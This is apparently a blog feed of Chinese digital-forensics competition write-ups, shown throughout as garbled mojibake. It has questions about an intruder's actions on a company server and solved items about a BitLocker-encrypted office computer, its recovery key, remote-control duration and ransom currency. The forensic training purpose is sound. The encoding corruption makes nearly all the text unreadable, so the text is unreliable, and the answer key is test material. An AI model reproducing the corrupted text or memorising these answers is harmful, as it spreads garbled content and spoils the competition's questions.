AGCæœåŠ¡å™¨10.0.66.184é‡Œæœ‰ä¸€ä¸ªAGCç›®å½• (Directory)ï¼Œå®ƒçš„å­ç›®å½• (Sub Directory) åŒ…å«ä»¥ä¸‹å“ªä¸€ä¸ª?    2</h1><p>å¤šé€‰    A:Accounting;<br>B:Picture;<br>C:Staff;<br>D:Sambashare;<br>E:Retail    </p><h1 id="126-å…¥ä¾µè€…è¿¸å…¥AGCæœåŠ¡å™¨10-0-66-184åï¼Œä»–æˆåŠŸæ‰§è¡Œä»¥ä¸‹å“ªäº›æŒ‡ä»¤-2"><a href="#126-å…¥ä¾µè€…è¿¸å…¥AGCæœåŠ¡å™¨10-0-66-184åï¼Œä»–æˆåŠŸæ‰§è¡Œä»¥ä¸‹å“ªäº›æŒ‡ä»¤-2" class="headerlink" title="126    å…¥ä¾µè€…è¿¸å…¥AGCæœåŠ¡å™¨10.0.66.184åï¼Œä»–æˆåŠŸæ‰§è¡Œä»¥ä¸‹å“ªäº›æŒ‡ä»¤?    2"></a>126    å…¥ä¾µè€…è¿¸å…¥AGCæœåŠ¡å™¨10.0.66.184åï¼Œä»–æˆåŠŸæ‰§è¡Œä»¥ä¸‹å“ªäº›æŒ‡ä»¤?    2</h1><p>å¤šé€‰    A:æª¢è§†äº†readme.txtå†…å®¹;<br>B:åˆ é™¤äº†ä¸‰ä¸ªæ¡£æ¡ˆ;<br>C:åˆ é™¤äº†ä¸€ä¸ªç›®å½• (Directory);<br>D:æ›¿æ¡£æ¡ˆæ”¹å;<br>E:å»ºç«‹äº†ä¸¤ä¸ªtxtæ¡£æ¡ˆ    </p><h1 id="127-å…¥ä¾µè€…æ›¾ç»ä¼ é€ä¸€ä¸ªæ¡£æ¡ˆåˆ°AGCæœåŠ¡å™¨10-0-66-184å¹¶å°†å®ƒæ”¹å-Rename-ï¼Œè¿™ä¸ªæ¡£æ¡ˆçš„åŸæ¥åç§°æ˜¯ä»€ä¹ˆï¼Ÿ-1"><a href="#127-å…¥ä¾µè€…æ›¾ç»ä¼ é€ä¸€ä¸ªæ¡£æ¡ˆåˆ°AGCæœåŠ¡å™¨10-0-66-184å¹¶å°†å®ƒæ”¹å-Rename-ï¼Œè¿™ä¸ªæ¡£æ¡ˆçš„åŸæ¥åç§°æ˜¯ä»€ä¹ˆï¼Ÿ-1" class="headerlink" title="127    å…¥ä¾µè€…æ›¾ç»ä¼ é€ä¸€ä¸ªæ¡£æ¡ˆåˆ°AGCæœåŠ¡å™¨10.0.66.184å¹¶å°†å®ƒæ”¹å (Rename)ï¼Œè¿™ä¸ªæ¡£æ¡ˆçš„åŸæ¥åç§°æ˜¯ä»€ä¹ˆï¼Ÿ    1"></a>127    å…¥ä¾µè€…æ›¾ç»ä¼ é€ä¸€ä¸ªæ¡£æ¡ˆåˆ°AGCæœåŠ¡å™¨10.0.66.184å¹¶å°†å®ƒæ”¹å (Rename)ï¼Œè¿™ä¸ªæ¡£æ¡ˆçš„åŸæ¥åç§°æ˜¯ä»€ä¹ˆï¼Ÿ    1</h1><p>å•é€‰<br>A:cGhvdG9zT0Zyb2NreQ==;<br>B:Finanical.xls;<br>C:readme.txt;<br>D:anonymous    </p><h1 id="128-æ‰¿ä¸Šé¢˜ï¼Œè¯¥æ¡£æ¡ˆåŸæ¡£çš„å»ºç«‹æ—¥æœŸæ˜¯ä»€ä¹ˆ-2"><a href="#128-æ‰¿ä¸Šé¢˜ï¼Œè¯¥æ¡£æ¡ˆåŸæ¡£çš„å»ºç«‹æ—¥æœŸæ˜¯ä»€ä¹ˆ-2" class="headerlink" title="128    æ‰¿ä¸Šé¢˜ï¼Œè¯¥æ¡£æ¡ˆåŸæ¡£çš„å»ºç«‹æ—¥æœŸæ˜¯ä»€ä¹ˆ?    2"></a>128    æ‰¿ä¸Šé¢˜ï¼Œè¯¥æ¡£æ¡ˆåŸæ¡£çš„å»ºç«‹æ—¥æœŸæ˜¯ä»€ä¹ˆ?    2</h1><p>å•é€‰<br>A:2022-10-21 08:10:30 (UTC+0);<br>B:2022-10-21 16:19:39 (UTC+0);<br>C:2022-10-22 08:10:30 (UTC+0);<br>D:2022-10-22 14:22:06 (UTC+0);<br>E:2022-10-22 16:19:39(UTC+0)    </p><h1 id="129-æ‰¿ä¸Šé¢˜ï¼Œè¯¥æ¡£æ¡ˆçš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆ-3"><a href="#129-æ‰¿ä¸Šé¢˜ï¼Œè¯¥æ¡£æ¡ˆçš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆ-3" class="headerlink" title="129    æ‰¿ä¸Šé¢˜ï¼Œè¯¥æ¡£æ¡ˆçš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆ?    3"></a>129    æ‰¿ä¸Šé¢˜ï¼Œè¯¥æ¡£æ¡ˆçš„SHA-256å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆ?    3</h1><p>å•é€‰<br>A:a6eef1â€¦ â€¦27364c;<br>B:54785câ€¦ â€¦fe86f0;<br>C:961f2bâ€¦ â€¦647d55;<br>D:a00e6câ€¦ â€¦d0eaab;<br>E:ä»¥ä¸Šçš†é    </p><h1 id="130-é€šè¿‡å–è¯è°ƒæŸ¥ç»“æœè¿¸è¡Œåˆ†æ-åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸Šé—®é¢˜åŠæƒ…èŠ‚-ï¼Œä»¥ä¸‹å“ªé¡¹å…³äºç‹æ™¯æµ©çš„æ¨æ–­æ˜¯æ­£ç¡®çš„-5"><a href="#130-é€šè¿‡å–è¯è°ƒæŸ¥ç»“æœè¿¸è¡Œåˆ†æ-åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸Šé—®é¢˜åŠæƒ…èŠ‚-ï¼Œä»¥ä¸‹å“ªé¡¹å…³äºç‹æ™¯æµ©çš„æ¨æ–­æ˜¯æ­£ç¡®çš„-5" class="headerlink" title="130    é€šè¿‡å–è¯è°ƒæŸ¥ç»“æœè¿¸è¡Œåˆ†æ (åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸Šé—®é¢˜åŠæƒ…èŠ‚)ï¼Œä»¥ä¸‹å“ªé¡¹å…³äºç‹æ™¯æµ©çš„æ¨æ–­æ˜¯æ­£ç¡®çš„?    5"></a>130    é€šè¿‡å–è¯è°ƒæŸ¥ç»“æœè¿¸è¡Œåˆ†æ (åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸Šé—®é¢˜åŠæƒ…èŠ‚)ï¼Œä»¥ä¸‹å“ªé¡¹å…³äºç‹æ™¯æµ©çš„æ¨æ–­æ˜¯æ­£ç¡®çš„?    5</h1><p>å¤šé€‰    A:æ›¾ç»é‡‡ç”¨ä»–çš„è®¡ç®—æœºå…¥ä¾µAGCé›†å›¢ç½‘ç»œ;<br>B:å‚³æ’­å„¿ç«¥è‰²æƒ…ç‰©å“;<br>C:äºAGCé›†å›¢å–å¾—å¤§é‡å®¢æˆ·èµ„æ–™;<br>D:é€šè¿‡VPNå–å¾—Rooneyå®¶é‡Œçš„IPåœ°å€;<br>E:ä¼å›¾æ›´æ”¹AGCé›†å›¢çš„ç½‘é¡µ    </p>]]></content>
      
      
      
        <tags>
            
            <tag> å–è¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¾äºš21å›¢ä½“</title>
      <link href="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/"/>
      <url>/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<p><code>uR%&#123;)Y&#39;Qz-n3oGU`ZJo@(1ntxp8U1+bW;JlZH^I4%0rxf;[N+eQ)Lolrw&amp;E%,4q1</code></p><h1 id="å‡ å¤©åï¼Œâ€œå¤§è·¯å»ºè®¾â€æ——ä¸‹æœ‰ä¸€å®¶åä¸ºâ€œå…ƒæåŸæ–™â€çš„ææ–™ä¾›åº”å­å…¬å¸ï¼Œè¯¥å…¬å¸å‘ç°å‡ åå‘˜å·¥çš„ä¸ªäººè´¢åŠ¡èµ„æ–™åœ¨ç½‘ä¸Šé­å…¬å¼€å‘å¸ƒã€‚ä¸ºäº†å‘˜å·¥å®‰å…¨ï¼Œä¸»ç®¡å†³å®šæŠ¥è­¦æ±‚åŠ©ã€‚ç»è­¦æ–¹è°ƒæŸ¥å‘ç°é»‘å®¢å…¥ä¾µçš„æ‰‹æ³•ä¸â€œå¤§è·¯å»ºè®¾â€çš„æ¡ˆä»¶ååˆ†ç›¸ä¼¼ï¼Œå› æ­¤å¼•èµ·è°ƒæŸ¥äººå‘˜æ€€ç–‘ä¸¤èµ·æ¡ˆä»¶æœ‰æ‰€å…³è”ã€‚ç»è°ƒæŸ¥åï¼Œè­¦æ–¹æ‹˜æ•äº†â€œå¸¸å¨â€å’Œâ€œç‰¹æ™®â€ä¸¤åæœ¬åœ°ç”·å­ï¼Œæ€€ç–‘ä»–ä»¬ä¸æœ¬æ¡ˆæœ‰å…³ã€‚è­¦æ–¹åœ¨æœæŸ¥ä»–ä»¬çš„ä½å®…åŠå…¬å¸åï¼Œæ‰£æŠ¼äº†æ•°å°æ•°ç è®¾å¤‡ï¼Œè¯·åˆ†æä»¥ä¸‹ç”µå­æ•°æ®å¹¶é‡å»ºç”µå­æ•°æ®ç—•è¿¹ï¼Œä»¥ç¡®è®¤â€œå¸¸å¨â€å’Œâ€œç‰¹æ™®â€åœ¨æœ¬æ¡ˆä¸­æ˜¯å¦æœ‰è¿æ³•çŠ¯ç½ªï¼Œå¹¶è¿˜åŸäº‹ä»¶ç»è¿‡ã€‚"><a href="#å‡ å¤©åï¼Œâ€œå¤§è·¯å»ºè®¾â€æ——ä¸‹æœ‰ä¸€å®¶åä¸ºâ€œå…ƒæåŸæ–™â€çš„ææ–™ä¾›åº”å­å…¬å¸ï¼Œè¯¥å…¬å¸å‘ç°å‡ åå‘˜å·¥çš„ä¸ªäººè´¢åŠ¡èµ„æ–™åœ¨ç½‘ä¸Šé­å…¬å¼€å‘å¸ƒã€‚ä¸ºäº†å‘˜å·¥å®‰å…¨ï¼Œä¸»ç®¡å†³å®šæŠ¥è­¦æ±‚åŠ©ã€‚ç»è­¦æ–¹è°ƒæŸ¥å‘ç°é»‘å®¢å…¥ä¾µçš„æ‰‹æ³•ä¸â€œå¤§è·¯å»ºè®¾â€çš„æ¡ˆä»¶ååˆ†ç›¸ä¼¼ï¼Œå› æ­¤å¼•èµ·è°ƒæŸ¥äººå‘˜æ€€ç–‘ä¸¤èµ·æ¡ˆä»¶æœ‰æ‰€å…³è”ã€‚ç»è°ƒæŸ¥åï¼Œè­¦æ–¹æ‹˜æ•äº†â€œå¸¸å¨â€å’Œâ€œç‰¹æ™®â€ä¸¤åæœ¬åœ°ç”·å­ï¼Œæ€€ç–‘ä»–ä»¬ä¸æœ¬æ¡ˆæœ‰å…³ã€‚è­¦æ–¹åœ¨æœæŸ¥ä»–ä»¬çš„ä½å®…åŠå…¬å¸åï¼Œæ‰£æŠ¼äº†æ•°å°æ•°ç è®¾å¤‡ï¼Œè¯·åˆ†æä»¥ä¸‹ç”µå­æ•°æ®å¹¶é‡å»ºç”µå­æ•°æ®ç—•è¿¹ï¼Œä»¥ç¡®è®¤â€œå¸¸å¨â€å’Œâ€œç‰¹æ™®â€åœ¨æœ¬æ¡ˆä¸­æ˜¯å¦æœ‰è¿æ³•çŠ¯ç½ªï¼Œå¹¶è¿˜åŸäº‹ä»¶ç»è¿‡ã€‚" class="headerlink" title="å‡ å¤©åï¼Œâ€œå¤§è·¯å»ºè®¾â€æ——ä¸‹æœ‰ä¸€å®¶åä¸ºâ€œå…ƒæåŸæ–™â€çš„ææ–™ä¾›åº”å­å…¬å¸ï¼Œè¯¥å…¬å¸å‘ç°å‡ åå‘˜å·¥çš„ä¸ªäººè´¢åŠ¡èµ„æ–™åœ¨ç½‘ä¸Šé­å…¬å¼€å‘å¸ƒã€‚ä¸ºäº†å‘˜å·¥å®‰å…¨ï¼Œä¸»ç®¡å†³å®šæŠ¥è­¦æ±‚åŠ©ã€‚ç»è­¦æ–¹è°ƒæŸ¥å‘ç°é»‘å®¢å…¥ä¾µçš„æ‰‹æ³•ä¸â€œå¤§è·¯å»ºè®¾â€çš„æ¡ˆä»¶ååˆ†ç›¸ä¼¼ï¼Œå› æ­¤å¼•èµ·è°ƒæŸ¥äººå‘˜æ€€ç–‘ä¸¤èµ·æ¡ˆä»¶æœ‰æ‰€å…³è”ã€‚ç»è°ƒæŸ¥åï¼Œè­¦æ–¹æ‹˜æ•äº†â€œå¸¸å¨â€å’Œâ€œç‰¹æ™®â€ä¸¤åæœ¬åœ°ç”·å­ï¼Œæ€€ç–‘ä»–ä»¬ä¸æœ¬æ¡ˆæœ‰å…³ã€‚è­¦æ–¹åœ¨æœæŸ¥ä»–ä»¬çš„ä½å®…åŠå…¬å¸åï¼Œæ‰£æŠ¼äº†æ•°å°æ•°ç è®¾å¤‡ï¼Œè¯·åˆ†æä»¥ä¸‹ç”µå­æ•°æ®å¹¶é‡å»ºç”µå­æ•°æ®ç—•è¿¹ï¼Œä»¥ç¡®è®¤â€œå¸¸å¨â€å’Œâ€œç‰¹æ™®â€åœ¨æœ¬æ¡ˆä¸­æ˜¯å¦æœ‰è¿æ³•çŠ¯ç½ªï¼Œå¹¶è¿˜åŸäº‹ä»¶ç»è¿‡ã€‚"></a>å‡ å¤©åï¼Œâ€œå¤§è·¯å»ºè®¾â€æ——ä¸‹æœ‰ä¸€å®¶åä¸ºâ€œå…ƒæåŸæ–™â€çš„ææ–™ä¾›åº”å­å…¬å¸ï¼Œè¯¥å…¬å¸å‘ç°å‡ åå‘˜å·¥çš„ä¸ªäººè´¢åŠ¡èµ„æ–™åœ¨ç½‘ä¸Šé­å…¬å¼€å‘å¸ƒã€‚ä¸ºäº†å‘˜å·¥å®‰å…¨ï¼Œä¸»ç®¡å†³å®šæŠ¥è­¦æ±‚åŠ©ã€‚ç»è­¦æ–¹è°ƒæŸ¥å‘ç°é»‘å®¢å…¥ä¾µçš„æ‰‹æ³•ä¸â€œå¤§è·¯å»ºè®¾â€çš„æ¡ˆä»¶ååˆ†ç›¸ä¼¼ï¼Œå› æ­¤å¼•èµ·è°ƒæŸ¥äººå‘˜æ€€ç–‘ä¸¤èµ·æ¡ˆä»¶æœ‰æ‰€å…³è”ã€‚ç»è°ƒæŸ¥åï¼Œè­¦æ–¹æ‹˜æ•äº†â€œå¸¸å¨â€å’Œâ€œç‰¹æ™®â€ä¸¤åæœ¬åœ°ç”·å­ï¼Œæ€€ç–‘ä»–ä»¬ä¸æœ¬æ¡ˆæœ‰å…³ã€‚è­¦æ–¹åœ¨æœæŸ¥ä»–ä»¬çš„ä½å®…åŠå…¬å¸åï¼Œæ‰£æŠ¼äº†æ•°å°æ•°ç è®¾å¤‡ï¼Œè¯·åˆ†æä»¥ä¸‹ç”µå­æ•°æ®å¹¶é‡å»ºç”µå­æ•°æ®ç—•è¿¹ï¼Œä»¥ç¡®è®¤â€œå¸¸å¨â€å’Œâ€œç‰¹æ™®â€åœ¨æœ¬æ¡ˆä¸­æ˜¯å¦æœ‰è¿æ³•çŠ¯ç½ªï¼Œå¹¶è¿˜åŸäº‹ä»¶ç»è¿‡ã€‚</h1><h1 id="å¤§è·¯å»ºè®¾"><a href="#å¤§è·¯å»ºè®¾" class="headerlink" title="å¤§è·¯å»ºè®¾"></a>å¤§è·¯å»ºè®¾</h1><h2 id="å·¥åœ°èŒå‘˜Açš„åŠå…¬å®¤è®¡ç®—æœº"><a href="#å·¥åœ°èŒå‘˜Açš„åŠå…¬å®¤è®¡ç®—æœº" class="headerlink" title="å·¥åœ°èŒå‘˜Açš„åŠå…¬å®¤è®¡ç®—æœº"></a>å·¥åœ°èŒå‘˜Açš„åŠå…¬å®¤è®¡ç®—æœº</h2><h3 id="1-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜Aè®¡ç®—æœºçš„ä¿®å¤å¯†é’¥æ ‡è¯†ç¬¦æ˜¯ä»€ä¹ˆï¼Ÿ-è¯·ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ-1åˆ†"><a href="#1-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜Aè®¡ç®—æœºçš„ä¿®å¤å¯†é’¥æ ‡è¯†ç¬¦æ˜¯ä»€ä¹ˆï¼Ÿ-è¯·ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ-1åˆ†" class="headerlink" title="1. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜Aè®¡ç®—æœºçš„ä¿®å¤å¯†é’¥æ ‡è¯†ç¬¦æ˜¯ä»€ä¹ˆï¼Ÿ(è¯·ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ) (1åˆ†)"></a>1. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜Aè®¡ç®—æœºçš„ä¿®å¤å¯†é’¥æ ‡è¯†ç¬¦æ˜¯ä»€ä¹ˆï¼Ÿ(è¯·ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ) (1åˆ†)</h3><p>230C1BB3-106A-4E4E-BF5D-3D10961585D4<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-091313330.png" class="">  </p><h3 id="2-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜Aè®¡ç®—æœºçš„ä¿®å¤å¯†é’¥è§£é™¤é”å®šæ˜¯ä»€ä¹ˆï¼Ÿ-è¯·ä»¥æ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ-1åˆ†"><a href="#2-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜Aè®¡ç®—æœºçš„ä¿®å¤å¯†é’¥è§£é™¤é”å®šæ˜¯ä»€ä¹ˆï¼Ÿ-è¯·ä»¥æ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ-1åˆ†" class="headerlink" title="2. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜Aè®¡ç®—æœºçš„ä¿®å¤å¯†é’¥è§£é™¤é”å®šæ˜¯ä»€ä¹ˆï¼Ÿ(è¯·ä»¥æ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ) (1åˆ†)"></a>2. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜Aè®¡ç®—æœºçš„ä¿®å¤å¯†é’¥è§£é™¤é”å®šæ˜¯ä»€ä¹ˆï¼Ÿ(è¯·ä»¥æ•°å­—è¾“å…¥ç­”æ¡ˆï¼Œä¸è¦è¾“å…¥â€-â€œ) (1åˆ†)</h3><p>BitLockeråŠ å¯†æ—¶ï¼Œæ˜¯å¿…é¡»è¿›è¡Œå¤‡ä»½çš„ä¸ç®¡æ˜¯ä»€ä¹ˆæ–¹å¼éƒ½ä¼šäº§ç”Ÿç—•è¿¹ã€‚æˆ‘ä»¬åœ¨Açš„è®¡ç®—æœºé‡Œæœç´¢å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶è®°å½•å«<code>BitLocker ä¿®å¾©é‡‘é‘° 49737A2E-6E82-4EAF-94B5-E1DB4F7CA642.TXT</code>ä½†æ˜¯å…¶è®¡ç®—æœºé‡Œæ‰¾ä¸åˆ°ï¼ŒçŒœæµ‹è¢«å«Œç–‘äººåŠ å¯†ååˆ é™¤äº†ã€‚è€Œå…¶ä½œæ¡ˆæ‰‹æ³•åˆä¸é˜¿åŠ›å£«ç›¸ä¼¼ï¼Œæˆ‘ä»¬åœ¨é˜¿é‡Œå£«çš„ftpé‡Œæœç´¢ï¼Œå¯ä»¥æ‰¾åˆ°<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-100852131.png" class=""><br>åœ¨é˜¿åŠ›å£«çš„FTPé‡Œå¯ä»¥æ‰¾åˆ°å¯†é’¥ã€‚<br>483714-461582-060962-373351-019646-502348-309628-684431</p><h3 id="3-å•é€‰é¢˜-å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«ä»€ä¹ˆç¨‹å¼åŠ å¯†ï¼Ÿ-1åˆ†"><a href="#3-å•é€‰é¢˜-å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«ä»€ä¹ˆç¨‹å¼åŠ å¯†ï¼Ÿ-1åˆ†" class="headerlink" title="3. [å•é€‰é¢˜] å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«ä»€ä¹ˆç¨‹å¼åŠ å¯†ï¼Ÿ (1åˆ†)"></a>3. [å•é€‰é¢˜] å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«ä»€ä¹ˆç¨‹å¼åŠ å¯†ï¼Ÿ (1åˆ†)</h3><p>A. Ransomware</p><p>B. BitLocker</p><p>C. AxCrypt</p><p>D. PGP</p><p>E. FileVault 2</p><p>B</p><h3 id="4-å•é€‰é¢˜-å·¥åœ°èŒå‘˜Açš„å­©å­æœ‰å¯èƒ½æ­£å‡†å¤‡å°±è¯»ä»€ä¹ˆå­¦æ ¡ï¼Ÿ-2åˆ†"><a href="#4-å•é€‰é¢˜-å·¥åœ°èŒå‘˜Açš„å­©å­æœ‰å¯èƒ½æ­£å‡†å¤‡å°±è¯»ä»€ä¹ˆå­¦æ ¡ï¼Ÿ-2åˆ†" class="headerlink" title="4. [å•é€‰é¢˜] å·¥åœ°èŒå‘˜Açš„å­©å­æœ‰å¯èƒ½æ­£å‡†å¤‡å°±è¯»ä»€ä¹ˆå­¦æ ¡ï¼Ÿ (2åˆ†)"></a>4. [å•é€‰é¢˜] å·¥åœ°èŒå‘˜Açš„å­©å­æœ‰å¯èƒ½æ­£å‡†å¤‡å°±è¯»ä»€ä¹ˆå­¦æ ¡ï¼Ÿ (2åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-094737103.png" class="">  <p>A. å°å­¦</p><p>B. ä¸­å­¦</p><p>C. å¹¼å„¿å›­</p><p>D. å¤§å­¦<br>C</p><h3 id="5-å¤šé€‰é¢˜-å·¥åœ°èŒå‘˜Aå¹¶æ²¡æœ‰æ‰“å¼€è¿‡å“ªä¸€ä¸ªæ¡£æ¡ˆï¼Ÿ-2åˆ†"><a href="#5-å¤šé€‰é¢˜-å·¥åœ°èŒå‘˜Aå¹¶æ²¡æœ‰æ‰“å¼€è¿‡å“ªä¸€ä¸ªæ¡£æ¡ˆï¼Ÿ-2åˆ†" class="headerlink" title="5. [å¤šé€‰é¢˜] å·¥åœ°èŒå‘˜Aå¹¶æ²¡æœ‰æ‰“å¼€è¿‡å“ªä¸€ä¸ªæ¡£æ¡ˆï¼Ÿ (2åˆ†)"></a>5. [å¤šé€‰é¢˜] å·¥åœ°èŒå‘˜Aå¹¶æ²¡æœ‰æ‰“å¼€è¿‡å“ªä¸€ä¸ªæ¡£æ¡ˆï¼Ÿ (2åˆ†)</h3><p>A. Staff3.xlsx</p><p>B. Staff4.xlsx</p><p>//C. Staff1.xlsx</p><p>D. Staff2.xlsx</p><p>//E. BTC address.bmp<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-100325468.png" class=""><br>åœ¨æœ€è¿‘è®¿é—®ä¸­åªèƒ½æ‰¾åˆ°å¦‚ä¸Šä¸¤ä¸ªæ–‡æ¡£<br>ABD</p><h3 id="6-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«è¿œç¨‹æ§åˆ¶äº†å¤šå°‘åˆ†é’Ÿï¼Ÿ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2åˆ†"><a href="#6-å¡«ç©ºé¢˜-å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«è¿œç¨‹æ§åˆ¶äº†å¤šå°‘åˆ†é’Ÿï¼Ÿ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2åˆ†" class="headerlink" title="6. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«è¿œç¨‹æ§åˆ¶äº†å¤šå°‘åˆ†é’Ÿï¼Ÿ(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (2åˆ†)"></a>6. [å¡«ç©ºé¢˜] å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«è¿œç¨‹æ§åˆ¶äº†å¤šå°‘åˆ†é’Ÿï¼Ÿ(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (2åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-101833916.png" class="">  <img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-101813844.png" class=""> <p>å¯ä»¥å–è¯å¤§å¸ˆä¸€æŠŠæ¢­ä¹Ÿå¯ä»¥åœ¨ç«çœ¼çœ‹æºæ–‡ä»¶æ¥è®¡ç®—ï¼Œä½†æ˜¯ç«çœ¼çœ‹åˆ°æºæ–‡ä»¶çš„æ—¶é—´æ¯”å–è¯å¤§å¸ˆçš„æ—¶é—´å°‘äº†8å°æ—¶ï¼Œå› ä¸ºè®¡ç®—æœºè®°å½•çš„æ—¶é—´æ˜¯UTCï¼Œè€ŒåŒ—äº¬æ—¶é—´æ˜¯ä¸œå…«åŒºå³UTC+8<br>11</p><h3 id="7-å•é€‰é¢˜-å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«åŠ å¯†åï¼Œè¢«è¦æ±‚å­˜å…¥çš„è™šç–‘è´§å¸æ˜¯ä»€ä¹ˆï¼Ÿ-1åˆ†"><a href="#7-å•é€‰é¢˜-å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«åŠ å¯†åï¼Œè¢«è¦æ±‚å­˜å…¥çš„è™šç–‘è´§å¸æ˜¯ä»€ä¹ˆï¼Ÿ-1åˆ†" class="headerlink" title="7. [å•é€‰é¢˜] å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«åŠ å¯†åï¼Œè¢«è¦æ±‚å­˜å…¥çš„è™šç–‘è´§å¸æ˜¯ä»€ä¹ˆï¼Ÿ (1åˆ†)"></a>7. [å•é€‰é¢˜] å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºè¢«åŠ å¯†åï¼Œè¢«è¦æ±‚å­˜å…¥çš„è™šç–‘è´§å¸æ˜¯ä»€ä¹ˆï¼Ÿ (1åˆ†)</h3><p>A. æ¯”ç‰¹å¸ç°é‡‘</p><p>B. æ¯”ç‰¹å¸</p><p>C. ä»¥å¤ªå¸</p><p>D. æ³°è¾¾å¸</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-102254148.png" class="">  <img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-102322320.png" class="">  <p>A</p><h3 id="8-å¡«ç©ºé¢˜-åœ¨å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºæ›¾ç»æ‰“å¼€è¿‡çš„Excelæ¡£æ¡ˆä¸­ï¼Œæœ‰å¤šå°‘äººæœ‰å¯èƒ½åœ¨æ³•å¾‹éƒ¨é—¨å·¥ä½œï¼Ÿ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#8-å¡«ç©ºé¢˜-åœ¨å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºæ›¾ç»æ‰“å¼€è¿‡çš„Excelæ¡£æ¡ˆä¸­ï¼Œæœ‰å¤šå°‘äººæœ‰å¯èƒ½åœ¨æ³•å¾‹éƒ¨é—¨å·¥ä½œï¼Ÿ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="8. [å¡«ç©ºé¢˜] åœ¨å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºæ›¾ç»æ‰“å¼€è¿‡çš„Excelæ¡£æ¡ˆä¸­ï¼Œæœ‰å¤šå°‘äººæœ‰å¯èƒ½åœ¨æ³•å¾‹éƒ¨é—¨å·¥ä½œï¼Ÿ(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>8. [å¡«ç©ºé¢˜] åœ¨å·¥åœ°èŒå‘˜Açš„è®¡ç®—æœºæ›¾ç»æ‰“å¼€è¿‡çš„Excelæ¡£æ¡ˆä¸­ï¼Œæœ‰å¤šå°‘äººæœ‰å¯èƒ½åœ¨æ³•å¾‹éƒ¨é—¨å·¥ä½œï¼Ÿ(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-103604216.png" class="">  <p>22</p><h2 